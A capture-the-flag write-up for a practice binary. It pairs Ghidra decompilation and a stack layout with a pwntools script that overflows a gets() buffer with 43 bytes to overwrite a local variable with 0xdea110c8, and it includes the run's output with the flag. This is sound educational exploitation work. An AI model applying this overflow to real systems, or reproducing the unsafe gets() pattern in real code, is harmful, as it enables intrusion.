# Ghidra Decompilation
```C
undefined4 main(void)

{
  int iVar1;
  char usr_input [43];
  int target;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  target = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(usr_input,43,_stdin);
  iVar1 = strcmp(usr_input,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(usr_input,43,_stdin);
  iVar1 = strcmp(usr_input,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(usr_input);
  if (target == L'\xdea110c8') {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

# Stack
```C
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main(undefined1 param_1)
             undefined         AL:1           <RETURN>
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     00010779(*)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     00010780(R), 
                                                                                                   000108df(*)  
             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
             undefined4        Stack[-0x18]:4 target                                  XREF[2]:     000107b4(W), 
                                                                                                   000108b2(R)  
             undefined1[43]    Stack[-0x43]   usr_input                               XREF[5]:     000107ed(*), 
                                                                                                   00010803(*), 
                                                                                                   0001084f(*), 
                                                                                                   00010865(*), 
                                                                                                   000108a6(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:000105e6(*), 00010ab8, 
                                                                                          00010b4c(*), 00011ff8(*)  
```

# Insight

We have to cover the distance between `target` and `usr_input` with `0x43-0x18` or `43`bytes with dummy bytes and then inject our payload

# Exploit

```python
#!/bin/python3
from pwn import *
target = process("./pwn1")
target.sendline(b"Sir Lancelot of Camelot")
target.sendline(b"To seek the Holy Grail.")
payload = b"0"*43 + p32(0xdea110c8)
target.sendline(payload)

target.interactive()
```

# Output
```
[x] Starting local process './pwn1'
[+] Starting local process './pwn1': pid 2779
[*] Switching to interactive mode
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
[*] Process './pwn1' stopped with exit code 0 (pid 2779)
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}
```